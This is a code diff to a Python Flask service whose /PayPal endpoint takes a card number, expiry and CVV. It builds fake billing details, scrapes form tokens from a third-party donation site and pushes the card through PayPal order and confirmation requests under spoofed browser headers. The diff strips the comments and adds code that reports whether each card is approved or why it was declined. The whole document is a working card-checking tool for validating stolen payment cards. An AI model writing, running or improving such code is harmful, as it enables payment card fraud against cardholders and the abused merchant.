@@ -22,11 +22,6 @@ def gdata():
 
 @app.route('/PayPal', methods=['GET'])
 def paypal_check():
-    """
-    API endpoint to check card through PayPal
-    Usage: /PayPal?cc=card_number|mm|yy|cvv
-    Example: /PayPal?cc=4125250545305008|11|29|326
-    """
     cc_param = request.args.get('cc')
     
     if not cc_param:
@@ -35,7 +30,6 @@ def paypal_check():
             "usage": "/PayPal?cc=card_number|mm|yy|cvv"
         }), 400
     
-    # Parse card details
     parts = cc_param.split('|')
     if len(parts) < 4:
         return jsonify({
@@ -47,25 +41,19 @@ def paypal_check():
     yy = parts[2].strip()
     cvv = parts[3].strip()
     
-    # Format expiry for PayPal (YYYY-MM)
     if len(yy) == 2:
         expiry = f"20{yy}-{mm}"
     else:
         expiry = f"{yy}-{mm}"
     
     try:
-        # Generate user data
         email, name, add, city, zip_code, phone = gdata()
-        
-        # Start session
         r = requests.Session()
         u = generate_user_agent()
         
-        # Get initial page
         resp = r.get('https://jazzonthetube.com/video/support-jazz-on-the-tube/', headers={'User-Agent': u})
         html = resp.text
         
-        # Extract tokens
         v1 = re.search(r'name="give-form-id-prefix" value="([^"]+)"', html).group(1)
         v2 = re.search(r'name="give-form-id" value="([^"]+)"', html).group(1)
         x1 = re.search(r'name="give-form-hash" value="([^"]+)"', html).group(1)
@@ -75,7 +63,6 @@ def paypal_check():
         x25 = json.loads(x24)
         x26 = x25['paypal']['accessToken']
         
-        # First POST request
         headers = {
             'Accept': '*/*',
             'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -133,7 +120,6 @@ def paypal_check():
         
         response = r.post('https://jazzonthetube.com/video/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
         
-        # Second POST with files
         headers = {
             'Accept': '*/*',
             'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -149,9 +135,7 @@ def paypal_check():
             'sec-ch-ua-platform': '"Android"',
         }
         
-        params = {
-            'action': 'give_paypal_commerce_create_order',
-        }
+        params = {'action': 'give_paypal_commerce_create_order'}
         
         files = {
             'give-honeypot': (None, ''),
@@ -197,7 +181,6 @@ def paypal_check():
         )
         xdata = (response.json()['data']['id'])
         
-        # PayPal CORS preflight
         headers = {
             'authority': 'cors.api.paypal.com',
             'accept': '*/*',
@@ -217,7 +200,6 @@ def paypal_check():
             headers=headers,
         )
         
-        # Confirm payment with card
         headers = {
             'authority': 'cors.api.paypal.com',
             'accept': '*/*',
@@ -260,7 +242,6 @@ def paypal_check():
             json=json_data,
         )
         
-        # PayPal logger
         headers = {
             'authority': 'www.paypal.com',
             'accept': 'application/json',
@@ -277,9 +258,7 @@ def paypal_check():
             'user-agent': u,
         }
         
-        params = {
-            'disableSetCookie': 'true',
-        }
+        params = {'disableSetCookie': 'true'}
         
         json_data = {
             'events': [
@@ -326,7 +305,6 @@ def paypal_check():
         
         response = r.post('https://www.paypal.com/xoplatform/logger/api/logger', params=params, headers=headers, json=json_data)
         
-        # Final approval
         headers = {
             'Accept': '*/*',
             'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -390,13 +368,51 @@ def paypal_check():
             files=files,
         )
         
-        # Return only the response text
-        return response.text, 200, {'Content-Type': 'text/plain'}
+        # Parse response to extract issue and description
+        try:
+            resp_json = response.json()
+            
+            # Check if successful
+            if resp_json.get('success') == True:
+                return jsonify({
+                    "Response": "APPROVED",
+                    "Description": "Payment successful"
+                })
+            
+            # Extract error details
+            if 'data' in resp_json and 'error' in resp_json['data']:
+                error = resp_json['data']['error']
+                details = error.get('details', [])
+                
+                if details:
+                    issue = details[0].get('issue', 'UNKNOWN')
+                    description = details[0].get('description', 'Unknown error')
+                    return jsonify({
+                        "Response": issue,
+                        "Description": description
+                    })
+                else:
+                    return jsonify({
+                        "Response": error.get('name', 'ERROR'),
+                        "Description": error.get('message', 'Unknown error')
+                    })
+            else:
+                return jsonify({
+                    "Response": "UNKNOWN",
+                    "Description": "Unexpected response format"
+                })
+                
+        except:
+            return jsonify({
+                "Response": "ERROR",
+                "Description": "Failed to parse response"
+            })
         
     except Exception as e:
         return jsonify({
-            "error": str(e)
-        }), 500
+            "Response": "ERROR",
+            "Description": str(e)
+        })
 
 @app.route('/health', methods=['GET'])
 def health():
